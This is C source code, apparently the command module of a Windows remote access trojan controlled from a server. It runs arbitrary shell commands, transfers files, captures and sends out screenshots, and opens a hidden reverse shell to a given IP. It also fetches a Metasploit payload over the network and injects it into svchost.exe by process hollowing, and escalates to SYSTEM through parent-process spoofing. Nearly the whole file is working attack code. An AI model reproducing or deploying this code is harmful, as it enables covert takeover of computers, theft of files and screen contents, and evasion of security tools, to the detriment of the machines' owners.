#include "command.h"

// 保存当前路径
char path[255];

// 发送当前路径
void SendPath(SOCKET sServer)
{
	ZeroMemory(path, sizeof(path));
	// 先获取当前路径
	if (getcwd(path, 250) != NULL)
	{
		SendData(sServer, path, sizeof(path));
		printf("send path\n");
	}
}

// 切换路径
BOOL ChangePath(char cmd[])
{
	// 是否执行cd命令
	if (strnicmp(cmd, "cd", 2) != 0)
		return FALSE;

	// 不支持 cd .. && cd ..这种格式
	// 切换路径
	if (_chdir(cmd + 3) == -1)
	{
		return TRUE;
	}

	// 获取当前路径
	if (!getcwd(path, 255))
	{
		return TRUE;
	}
	return TRUE;
}

// 下载文件
BOOL Download(SOCKET sServer, char cmd[])
{
	// 是否执行upload命令
	if (_strnicmp(cmd, "upload", 6) != 0)
		return FALSE;

	// 判断是否收到错误信息
	if (IsRecvError(sServer))
	{
		printf("file doesn't exist\n");
		return TRUE;
	}

	// 获取文件名
	char file[128] = { 0 };
	ZeroMemory(file, sizeof(file));
	RecvData(sServer, file, sizeof(file));

	int fileSize;
	// 获取文件大小
	RecvData(sServer, (char*)&fileSize, sizeof(fileSize));
	printf("recv file size is %d bytes\n", fileSize);

	// 获取当前路径
	char path[255];
	getcwd(path, 255);

	// 文件后缀名
	char* extension = strrchr(file, '.');

	// 获取时间戳
	char time[25];
	GetTimestamp(time);

	// 保存文件路径
	strcat(path, "\\");
	strcat(path, time);
	strcat(path, extension);

	FILE* fp = fopen(path, "wb");
	char buffer[256];
	if (fp == NULL)
	{
		printf("can't open file path\n");
		// 发送错误信息给对方
		SendError(sServer);
		return TRUE;
	}

	// 告诉对方可以进行文件传输了
	SendSuccess(sServer);

	// 接收文件内容
	printf("download %s\n", file);
	while (TRUE)
	{
		int size = recv(sServer, buffer, sizeof(buffer), 0);
		if (size == 0 || strcmp(buffer, "over") == 0)
			break;

		// 写入文件
		fwrite(buffer, 1, size, fp);
	}

	fclose(fp);
	printf("save file to %s\n", path);

	// 将保存路径发送给对方
	SendData(sServer, path, sizeof(path));
	return TRUE;
}

// 上传文件
BOOL Upload(SOCKET sServer, char cmd[])
{
	// 是否执行download命令
	if (_strnicmp(cmd, "download", 8) != 0)
		return FALSE;

	char file[128] = { 0 };
	ZeroMemory(file, sizeof(file));
	// 获取文件名
	memcpy(file, cmd + 9, strlen(cmd) - 9);
	printf("upload %s\n", file);

	FILE* fp = fopen(file, "rb");
	// 文件不存在
	if (fp == NULL || fp == 0)
	{
		printf("文件不存在\n");
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// 发送文件名
	SendData(sServer, file, sizeof(file));

	// 获取文件大小
	fseek(fp, 0, SEEK_END);
	int fileSize = ftell(fp);
	fseek(fp, 0, SEEK_SET);

	printf("send file size is %d bytes\n", fileSize);
	// 发送文件大小
	SendData(sServer, (char*)&fileSize, sizeof(fileSize));

	if (IsRecvError(sServer))
	{
		return TRUE;
	}

	// 发送文件内容
	char buffer[256] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));
	int size;
	while (!feof(fp))
	{
		size = fread(buffer, 1, sizeof(buffer), fp);
		send(sServer, buffer, size, 0);
	}

	Sleep(1000);
	fclose(fp);
	// 结尾内容是必须要有的 因为少了这行，排了一天的bug
	SendData(sServer, "over", 5);
	printf("send file over\n");

	return TRUE;
}

// 截屏命令
BOOL Screen(SOCKET sServer, char cmd[])
{
	// 是否执行screen命令
	if (strnicmp(cmd, "screen", 6) != 0)
		return FALSE;

	// 获取时间戳
	char time[25];
	GetTimestamp(time);

	// 保存的图片路径
	char filePath[255];
	strcpy(filePath, path);
	strcat(filePath, "\\");
	strcat(filePath, time);
	strcat(filePath, ".jpg");

	// 截屏失败
	if (!ScreenShot(filePath))
	{
		// 发送数据 告诉服务器截屏失败
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// 截屏成功 发送照片路径
	SendData(sServer, filePath, sizeof(filePath));

	// 上传图片
	char downloadCmd[255] = "download ";
	strcat(downloadCmd, filePath);
	Upload(sServer, downloadCmd);

	// 上传完毕后删除图片
	remove(filePath);
	return TRUE;
}

// 反弹NC
BOOL NC(SOCKET sServer, char cmd[])
{
	// 是否执行nc命令
	if (_strnicmp(cmd, "nc ", 3) != 0)
		return FALSE;

	int size = strlen("nc");
	int index = Left(cmd, ' ');

	// 错误nc格式
	if (IsErrorFormat(cmd, index, size))
	{
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	char ip[20] = { 0 };
	char port[10] = { 0 };
	ZeroMemory(ip, sizeof(ip));
	ZeroMemory(port, sizeof(port));

	// 提取ip
	GetIP(ip, cmd, index, size);
	// 提取端口
	GetPort(port, cmd, index, size);

	int bRet = FALSE;

	SOCKET Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
	// 创建失败
	if (Winsock == INVALID_SOCKET)
	{
		SendError(sServer);
		return TRUE;
	}

	SOCKADDR_IN nc;
	nc.sin_family = AF_INET;
	nc.sin_port = htons(atoi(port));
	nc.sin_addr.S_un.S_addr = inet_addr(ip);

	// 成功返回0
	bRet = WSAConnect(Winsock, (SOCKADDR*)&nc, sizeof(nc), NULL, NULL, NULL, NULL);
	if (bRet == SOCKET_ERROR)
	{
		SendError(sServer);
		return TRUE;
	}

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

	si.cb = sizeof(si);
	// 隐藏窗口
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	// 重定向管道
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)Winsock;

	TCHAR szCommandLine[255] = TEXT("cmd.exe");
	bRet = CreateProcess(NULL, szCommandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	if (!bRet)
	{
		SendError(sServer);
		return TRUE;
	}

	printf("exec nc\n");
	SendSuccess(sServer);
	return TRUE;
}

// 磁盘命令
BOOL Drive(SOCKET sServer, char cmd[])
{
	// 是否执行drive命令
	if (_strnicmp(cmd, "drive", 5) != 0)
		return FALSE;

	ZeroMemory(cmd, 255);
	// 使用cmd的原生命令
	strcpy(cmd, "for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do @if exist %i: echo %i:");
	SendCmdResult(sServer, cmd);
	return TRUE;
}

// 反弹msf
BOOL MSF(SOCKET sServer, char cmd[])
{
	// 是否执行msf命令
	if (_strnicmp(cmd, "msf ", 4) != 0)
		return FALSE;

	ULONG32 size;

	int length = strlen("msf");
	int index = Left(cmd, ' ');

	// 错误msf格式
	if (IsErrorFormat(cmd, index, length))
	{
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	char ip[20] = { 0 };
	char port[10] = { 0 };
	ZeroMemory(ip, sizeof(ip));
	ZeroMemory(port, sizeof(port));

	// 提取ip
	GetIP(ip, cmd, index, length);
	// 提取端口
	GetPort(port, cmd, index, length);

	// 与msf建立连接
	SOCKET msf = socket(AF_INET, SOCK_STREAM, 0);
	if (msf == INVALID_SOCKET)
	{
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	int ret = 0;
	// 设置发送地址
	SOCKADDR_IN server;
	server.sin_family = AF_INET;
	server.sin_port = htons(atoi(port));
	ret = inet_pton(AF_INET, ip, &server.sin_addr.S_un.S_addr);
	if (ret != 1)
	{
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	ret = connect(msf, (SOCKADDR*)&server, sizeof(SOCKADDR));
	// 连接失败
	if (ret == SOCKET_ERROR)
	{
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// 接收数据失败
	int count = recv(msf, (char*)&size, 4, 0);
	if (count != 4 || size <= 0)
	{
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// 傀儡进程

	/* 申请空间 */
	unsigned char* buffer = (unsigned char*)malloc(sizeof(unsigned char) * size + 6);
	if (!buffer)
	{
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);
	buffer[0] = 0xC0;
	buffer[0] -= 1;
	memcpy(buffer + 1, &msf, 4);

	// 初始化结构体
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);

	BOOL bRet = FALSE;
	// 创建挂起进程
	bRet = CreateProcessA(NULL, (LPSTR)"svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
	if (!bRet)
	{
		free(buffer);
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// 在进程中申请空间
	LPVOID lpAddress = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpAddress)
	{
		free(buffer);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// 接收所有数据
	int tret = 0;
	int nret = 0;

	void* startb = buffer + 5;
	char* tb = (char*)startb;
	while (tret < (int)size)
	{
		nret = recv(msf, tb, size - tret, 0);
		tb += nret;
		tret += nret;
		// 接收数据失败
		if (nret == SOCKET_ERROR)
		{
			free(buffer);
			CloseHandle(pi.hThread);
			CloseHandle(pi.hProcess);
			SendError(sServer);
			closesocket(msf);
			return TRUE;
		}
	}

	SendSuccess(sServer);

	// 写入shellcode数据
	bRet = WriteProcessMemory(pi.hProcess, lpAddress, buffer, size + 6, NULL);
	if (!bRet)
	{
		free(buffer);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// 获取线程上下文
	CONTEXT threadContext;
	threadContext.ContextFlags = CONTEXT_FULL;
	bRet = GetThreadContext(pi.hThread, &threadContext);
	if (!bRet)
	{
		free(buffer);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	//	修改线程上下文中EIP / RIP的值为申请的内存的首地址
#ifdef _WIN64 
	// 64位    
	threadContext.Rip = (DWORD64)lpAddress;
#else     
	// 32位
	threadContext.Eip = (DWORD)lpAddress;
#endif

	// 设置挂起进程的线程上下文
	bRet = SetThreadContext(pi.hThread, &threadContext);
	if (!bRet)
	{
		free(buffer);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		closesocket(msf);
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// 恢复主线程
	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
	free(buffer);

	Sleep(1000);
	return TRUE;
}

// 提权 需管理员权限
BOOL GetSystem(SOCKET sServer, char cmd[])
{
	// 是否执行getsystem命令
	if (_strnicmp(cmd, "getsystem", 9) != 0)
		return FALSE;

	// 当前用户没有管理员权限
	if (!IsUserAnAdmin())
	{
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// 尝试拿到调试权限
	EnableDebugAbility();

	// 进程数
	DWORD processCnt = 0;
	// 获取列表指针
	PWTS_PROCESS_INFO_EX processList = GetProcessList(&processCnt);
	// 获取进程列表失败
	if (!processList)
	{
		SendError(sServer);
		return TRUE;
	}

	SendSuccess(sServer);

	// 保存结构体指针
	PWTS_PROCESS_INFO_EX tempList = processList;

	char buffer[256] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));

	// 记录注入的pid
	DWORD pid = -1;

	// 循环父进程欺骗
	for (DWORD i = 0; i < processCnt; i++)
	{
		// 获取权限
		GetAccount(tempList->pUserSid, buffer);
		// 判断进程是否拥有system权限
		if (strcmp(buffer,"NT AUTHORITY\\SYSTEM") == 0)
		{
			// 尝试父进程欺骗
			if (PPIDSpoofing(sServer, tempList->ProcessId))
			{
				pid = tempList->ProcessId;
				break;
			}
		}
		ZeroMemory(buffer, sizeof(buffer));

		// 移到下一个进程
		tempList++;
	}
	
	// 释放内存
	WTSFreeMemoryEx(WTSTypeProcessInfoLevel1, processList, processCnt);
	processList = NULL;

	// 注入失败
	if (pid == -1)
	{
		SendError(sServer);
		return TRUE;
	}

	ZeroMemory(buffer, sizeof(buffer));
	IntToStr(pid, buffer);
	//发送注入成功后的pid
	SendData(sServer, buffer, 20);

	printf("sucess to %d\n", pid);
	return TRUE;
}

// 获取pid
BOOL GetPID(SOCKET sServer, char cmd[])
{
	// 是否执行getpid命令
	if (_strnicmp(cmd, "getpid", 6) != 0)
		return FALSE;

	DWORD pid = GetCurrentProcessId();
	char buffer[10] = { 0 };
	ZeroMemory(buffer, sizeof(buffer));
	IntToStr(pid, buffer);
	SendData(sServer, buffer, sizeof(buffer));

	return TRUE;
}

// 帮助菜单
BOOL Help(char cmd[])
{
	// 是否执行help命令
	if (_strnicmp(cmd, "help", 4) != 0)
		return FALSE;

	return TRUE;
}

// 执行命令
void ExecCmd(SOCKET sServer, char cmd[])
{
	// 帮助命令
	if (Help(cmd))
		return;

	// 获取pid
	if (GetPID(sServer, cmd))
		return;
	
	// 提权成system
	if (GetSystem(sServer, cmd))
		return;

	// 反弹msf
	if (MSF(sServer, cmd))
		return;
	

	// 磁盘命令
	if (Drive(sServer, cmd))
		return;

	// 反弹NC
	if (NC(sServer, cmd))
		return;

	// 查看进程
	if (PS(sServer, cmd))
		return;

	// 屏幕截图
	if (Screen(sServer, cmd))
		return;

	// 执行文件下载
	if (Download(sServer, cmd))
		return;

	// 执行文件上传
	if (Upload(sServer, cmd))
		return;

	// 执行cd命令
	if (ChangePath(cmd))
		return;

	// 执行cmd命令
	SendCmdResult(sServer, cmd);
	printf("send cmd result over\n");
}

// 发送cmd执行后的结果
void SendCmdResult(SOCKET sServer, char cmd[])
{
	FILE* fp;
	char buffer[1024] = { 0 };
	if ((fp = _popen(cmd, "r")) == NULL)
	{
		SendError(sServer);
		return;
	}

	SendSuccess(sServer);

	// 这里还是有问题，如果对方执行dir asdf命令，对方收不到的完全报错信息
	// cd asdf buffer的数据是空的 正常回显应该是系统找不到指定的路径。
	while (fgets(buffer, sizeof(buffer), fp) != NULL)
	{
		send(sServer, buffer, sizeof(buffer), 0);
		ZeroMemory(buffer, sizeof(buffer));
	}

	_pclose(fp);
	// 发送SendOver告诉对方，回显结果已经发送完毕
	SendData(sServer, "SendOver", 9);
}

// 获取时间戳
void GetTimestamp(char str[])
{
	time_t now;
	time(&now);
	_itoa((int)now, str, 10);
}
